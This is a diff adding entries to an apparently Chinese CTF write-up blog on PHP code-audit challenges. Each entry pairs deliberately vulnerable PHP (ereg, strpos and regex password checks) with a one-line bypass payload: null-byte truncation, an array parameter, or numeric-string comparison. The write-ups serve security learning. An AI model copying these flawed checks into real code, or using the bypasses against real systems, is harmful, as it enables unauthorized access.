@@ -355,6 +355,117 @@ Login first!
 
 <font color="red">题目好像坏了</font>
 
+<h2 id="11ereg正则00截断">11.ereg正则%00截断</h2>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$flag</span> <span class="o">=</span> <span class="s2">"xxx"</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span>
+<span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">ereg</span> <span class="p">(</span><span class="s2">"^[a-zA-Z0-9]+$"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="k">echo</span> <span class="s1">'
+
+You password must be alphanumeric
+
+'</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">8</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">9999999</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">],</span> <span class="s1">'-'</span><span class="p">)</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="c1">//strpos — 查找字符串首次出现的位置
+</span><span class="p">{</span>
+<span class="k">die</span><span class="p">(</span><span class="s1">'Flag: '</span> <span class="o">.</span> <span class="nv">$flag</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">else</span>
+<span class="p">{</span>
+<span class="k">echo</span><span class="p">(</span><span class="s1">'
+- have not been found
+
+'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="p">}</span>
+<span class="k">else</span>
+<span class="p">{</span>
+<span class="k">echo</span> <span class="s1">'
+Invalid password
+
+'</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><strong>payload:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5.php?password=1e9%00*-*
+</code></pre></div></div>
+
+<h2 id="12strpos数组绕过">12.strpos数组绕过</h2>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$flag</span> <span class="o">=</span> <span class="s2">"flag"</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ctf'</span><span class="p">]))</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">ereg</span> <span class="p">(</span><span class="s2">"^[1-9]+$"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ctf'</span><span class="p">])</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span>
+<span class="k">echo</span> <span class="s1">'必须输入数字才行'</span><span class="p">;</span>
+<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ctf'</span><span class="p">],</span> <span class="s1">'#biubiubiu'</span><span class="p">)</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span>
+<span class="k">die</span><span class="p">(</span><span class="s1">'Flag: '</span><span class="o">.</span><span class="nv">$flag</span><span class="p">);</span>
+<span class="k">else</span>
+<span class="k">echo</span> <span class="s1">'骚年，继续努力吧啊~'</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><strong>payload:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>15.php?ctf[]=1
+</code></pre></div></div>
+
+<h2 id="13数字验证正则绕过">13.数字验证正则绕过</h2>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nv">$flag</span> <span class="o">=</span> <span class="s1">'flag{test}'</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="s2">"POST"</span> <span class="o">==</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">])</span>
+<span class="p">{</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span>
+<span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">&gt;=</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^[[:graph:]]{12,}$/'</span><span class="p">,</span> <span class="nv">$password</span><span class="p">))</span> <span class="c1">//preg_match — 执行一个正则表达式匹配
+</span><span class="p">{</span>
+<span class="k">echo</span> <span class="s1">'flag'</span><span class="p">;</span>
+<span class="k">exit</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">while</span> <span class="p">(</span><span class="k">TRUE</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="nv">$reg</span> <span class="o">=</span> <span class="s1">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="mi">6</span> <span class="o">&gt;</span> <span class="nb">preg_match_all</span><span class="p">(</span><span class="nv">$reg</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$arr</span><span class="p">))</span>
+<span class="k">break</span><span class="p">;</span>
+<span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$ps</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'punct'</span><span class="p">,</span> <span class="s1">'digit'</span><span class="p">,</span> <span class="s1">'upper'</span><span class="p">,</span> <span class="s1">'lower'</span><span class="p">);</span> <span class="c1">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母
+</span><span class="k">foreach</span> <span class="p">(</span><span class="nv">$ps</span> <span class="k">as</span> <span class="nv">$pt</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/[[:</span><span class="nv">$pt</span><span class="s2">:]]+/"</span><span class="p">,</span> <span class="nv">$password</span><span class="p">))</span>
+<span class="nv">$c</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$c</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+<span class="c1">//&gt;=3，必须包含四种类型三种与三种以上
+</span><span class="k">if</span> <span class="p">(</span><span class="s2">"42"</span> <span class="o">==</span> <span class="nv">$password</span><span class="p">)</span> <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+<span class="k">else</span> <span class="k">echo</span> <span class="s1">'Wrong password'</span><span class="p">;</span>
+<span class="k">exit</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><strong>payload:</strong></p>
+
+<p>想办法绕过代码里面的正则即可</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>password=42.0e+000000000
+</code></pre></div></div>
+
+<h2 id="14简单的waf">14.简单的waf</h2>
+
+<font color="red">题目好像坏了</font>
+
+
     </article>
   
     <div class="newold">
